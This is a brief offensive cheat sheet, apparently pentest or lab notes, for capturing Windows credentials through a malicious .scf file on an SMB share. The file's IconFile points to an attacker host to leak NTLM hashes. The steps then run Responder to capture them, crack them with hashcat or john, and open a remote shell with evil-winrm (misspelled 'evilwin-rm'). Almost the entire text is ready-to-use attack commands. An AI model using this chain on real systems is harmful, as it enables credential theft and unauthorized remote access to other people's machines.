#### Upload `.scf` file to a SMB share
```
[Shell]
Command=2
IconFile=\\attack.ip\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```
#### Start responder
```
sudo responder -w -I tun0
```
#### Wait for a victim hash
Use hashcat or john
#### Use evilwin-rm to get shell
```
evilwin-rm -i ip -u user -p password
```